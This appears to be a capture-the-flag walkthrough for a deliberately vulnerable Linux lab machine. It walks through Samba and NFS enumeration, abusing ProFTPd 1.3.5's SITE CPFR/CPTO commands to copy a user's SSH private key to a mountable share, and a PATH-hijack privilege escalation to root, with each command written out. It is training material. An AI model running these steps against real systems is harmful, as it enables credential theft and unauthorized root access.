# Kenobi

Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation. 

Set up environment IP as IP_Machine

```
export IP=10.10.184.151
```

![IP](./images/IP.png)

## Task 1 - Deploy the vulnerable machine

* Scan the machine with nmap, how many ports are open?
	
	```
	nmap -sV $IP | tee nmap-scan.txt
	```

	File scan resulted [here](./file/nmap-scan.txt)

	![task1-nmap](./images/task1-nmap.png)

## Task 2 - Enumerating Samba for shares

* Using the nmap command below, how many shares have been found?
	
	```
	nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
	```  

	![task2-samba](./images/task2-samba.png)

* Once you're connected, list the files on the share. What is the file can you see?
	
	```
	smbclient //$IP/anonymous
	```

	![task2-smbclient](./images/task2-smbclient.png)

	Get the file [here](./files/log.txt)

	![task2-smbget](./images/task2-smbget.png)

* In our case, port 111 is access to a network file system. Lets use nmap to enumerate this. What mount can we see?
	
	```
	sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
	```  

	![task2-nfs](./images/task2-nfs.png)

## Task 3 - Gain initial access with ProFtpd

Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

* What is the version?  
	
	```
	nc 10.10.65.169 21
	```

	![task3-version](./images/task3-version.png)

* How many exploits are there for the ProFTPd running?
	
	```
	searchsploit ProFtpd 1.3.5
	```

	![task3-sploit](./images/task3-sploit.png)


* We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

	```
	SITE CPFR /home/kenobi/.ssh/id_rsa  
	SITE CPTO /var/tmp/id_rsa
	```  
	
	![task3-copy](./images/task3-copy.png)

* What is Kenobi's user flag (/home/kenobi/user.txt)?

	* Lets mount the /var/tmp directory to our machine
	
		```
		mkdir /tmp/KenobiNFS
		sudo mount $IP:/var /tmp/KenobiNFS
		ls -la /tmp/KenobiNFS
		```
		
		![task3-kenobiNFS](./images/task3-kenobiNFS.png)

	*  We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.
	
		```
		cp /tmp/KenobiNFS/tmp/id_rsa .
		sudo chmod 600 id_rsa
		ssh -i id_rsa kenobi@$IP
		```
		
		Get the file [here](./files/id_rsa)

		![task3-id_rsa](./images/task3-id_rsa.png)

	* What is Kenobi's user flag (/home/kenobi/user.txt)?
		
		```
		cat /home/kenobi/user.txt
		```

		![task3-usertext](./images/task3-usertext.png)

## Task 4 - Privilege Escalation with Path Variable Manipulation

* What file looks particularly out of the ordinary?
	
	```
	find / -type f -perm -4000 -ls 2>/dev/null
	```

	![task4-SUID](./images/task4-SUID.png)

* Run the binary, how many options appear?
	
	```
	/usr/bin/menu
	```

	![task4-binary](./images/task4-binary.png)

* Strings is a command on Linux that looks for human readable strings on a binary. 
	
	```
	strings /usr/bin/menu
	```

	![task4-strings](./images/task4-strings.png)

* As this file runs as the root users privileges, we can manipulate our path gain a root shell.

	```
	echo /bin/sh > curl
	chmod 777 curl
	export PATH=/tmp:$PATH
	/usr/bin/menu
	```

	![task4-privilege](./images/task4-privilege.png)

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

* What is the root flag (/root/root.txt)?
	
	![task4-rootTXT](./images/task4-rootTXT.png)
